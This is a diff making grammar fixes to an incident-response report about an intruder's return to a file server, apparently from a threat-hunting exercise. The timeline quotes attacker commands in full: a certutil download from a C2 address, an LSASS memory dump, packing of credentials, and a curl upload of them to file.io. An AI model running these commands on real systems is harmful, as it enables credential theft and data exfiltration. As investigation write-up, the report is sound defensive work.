@@ -32,7 +32,7 @@
 - Resolved
 
 ## Incident Overview:
-- After establishing initial access on November 19th, network monitoring detected an unauthorized entity returning approximately 72 hours later at precisely `2025-11-22T00:27:58.4166424Z`. Suspicious lateral movement and large data transfers were observed overnight on the file server. Evidence of credential collection and exfiltration of data were followed by actions that align with persistence for continued privileges and anti-forensic attempts.
+- After establishing initial access on November 19th, network monitoring detected an unauthorized entity returning approximately 72 hours after at precisely `2025-11-22T00:27:58.4166424Z`. Suspicious lateral movement and large data transfers were observed overnight on the file server. Evidence of credential collection and exfiltration of data were followed by actions that align with persistence for continued privileges and anti-forensic attempts.
 
 ## Key Findings:
 Due to a compromised device, the unauthorized entity performed lateral movement and discovered a critical server `azuki-fileserver01` through remote share enumeration. The threat actor then continued to probe for privilege and network enumeration. They then implemented a staging directory and began steps for defensive evasion by attempting to hide the staging directory path through obfuscation. Using legitimate system utilities with network capabilities, the unauthorized entity then weaponized "Living off the Land" techniques to download a script into the staging directory.<br>
@@ -287,13 +287,13 @@ A forward-looking strategy will involve more granular network access controls an
 # Technical Timeline
 |              Time              |                                                              Activity                                                              |
 |--------------------------------|------------------------------------------------------------------------------------------------------------------------------------|
-| `2025-11-22T00:27:58.4166424Z` | Returning connection source `159.26.106.98` after dwell time of approximately 72 hours later of the initial compromise. The IP address was different than the original compromise. |
-| `2025-11-19T19:10:49.2285576Z` | Lateral movement from the compromised device to the file server `azuki-fileserver01`. The DeviceProcessEvent `mstsc.exe`, which was known to be associated with the orginal compromise, correlated successful remote logins. |
+| `2025-11-22T00:27:58.4166424Z` | Returning connection source `159.26.106.98` after dwell time of approximately 72 hours later of the initial compromise. The IP address was different from the original compromise. |
+| `2025-11-19T19:10:49.2285576Z` | Lateral movement from the compromised device to the file server `azuki-fileserver01`. The DeviceProcessEvent `mstsc.exe`, which was known to be associated with the original compromise, correlated successful remote logins. |
 | `2025-11-19T19:10:49.2662627Z` | Unauthorized access to the administrator account `fileadmin` was identified with an unknown LogonType. |
 | `2025-11-22T00:40:54.8271951Z` | `"net.exe" share` command was executed in order to enumerate local network shares. Initial attempts at discovery began at this timeframe. |
 | `2025-11-22T00:42:01.9579347Z` | `"net.exe" view \\10.1.0.188` command was executed to enumerate remote shares. |
 | `2025-11-22T00:42:24.1217046Z` | Privilege enumeration techniques were implemented with a Windows native utility using the executable command: `"whoami.exe" /all`. |
-| `2025-11-22T00:42:46.3655894Z` | Network configuration enumeration using a Windows native utility were executed using: `"ipconfig.exe" /all`. |
+| `2025-11-22T00:42:46.3655894Z` | Network configuration enumeration using a Windows native utility was executed using: `"ipconfig.exe" /all`. |
 | `2025-11-22T00:55:43.9986049Z` | `"attrib.exe" +h +s C:\Windows\Logs\CBS` was executed in order to hide the staging directory. |
 | `2025-11-22T00:55:43.9986049Z` | The staging directory path `C:\Windows\Logs\CBS` was created to organize tools and data for exfiltration. This directory path is critical for IoC. |
 | `2025-11-22T00:56:47.4100711Z` | A PowerShell script was downloaded using a Windows binary. `*"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` was executed to download the malicious script from the C2 server. |
@@ -302,7 +302,7 @@ A forward-looking strategy will involve more granular network access controls an
 | `2025-11-22T01:30:10.0981853` | The command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .` indicates utilization of a cross-platform compression tool to prepare the data in a portable format before exfiltration. |
 | `2025-11-22T02:03:19.9845969Z` | The credential dumping tool was renamed to `pd.exe`. This is a basic OpSec practice in order to evade signature-based detection. |
 | `2025-11-22T02:24:44.3906047Z` | The process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` indicated the target of a critical security process (LSASS). This is critical evidence that shows exactly how credentials were extracted. |
-| `2025-11-22T01:59:54.2755596Z` | In order to exfiltrate the data, a native Windows utility was used to upload the compressed archive to an external enpoint with the command: `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` |
+| `2025-11-22T01:59:54.2755596Z` | In order to exfiltrate the data, a native Windows utility was used to upload the compressed archive to an external endpoint with the command: `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` |
 | `2025-11-22T01:59:54.2755596Z` | The cloud service `file.io` can be identified as the cloud file sharing service to exfiltrate the credentials. |
 | `2025-11-22T02:10:50.7952326Z` | `FileShareSync`, a registry value name, was added and modified in order to appear as a legitimate boot or logon autostart execution software. This was done in order to establish persistence. |
 | `2025-11-22T02:10:50.7952326Z` | The PowerShell script `svchost.ps1` was masqueraded as a legitimate Windows component to avoid suspicion. This script was identified as the persistence beacon. |
